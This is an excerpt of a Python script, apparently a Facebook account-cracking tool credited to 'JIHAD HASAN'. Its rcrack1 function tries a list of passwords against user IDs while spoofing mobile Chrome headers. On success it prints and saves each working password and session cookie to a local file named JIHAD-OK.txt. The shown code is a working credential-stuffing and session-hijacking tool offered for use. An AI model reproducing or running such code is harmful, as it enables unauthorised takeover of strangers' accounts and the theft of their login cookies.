...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mJIHAD HASAN
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mJIHAD HASAN
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
    #    os.system('xdg-open fb:/groups/1745476639209832?ref=share&mibextid=NSMWBT')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5839.202", "Google Chrome";v="116.0.5839.202"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"TECNO KF8"',
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; Lenovo TB-X306F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5839.202 Mobile Safari/537.36',
            'viewport-width': '980',
}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[JIHAD-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/JIHAD-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
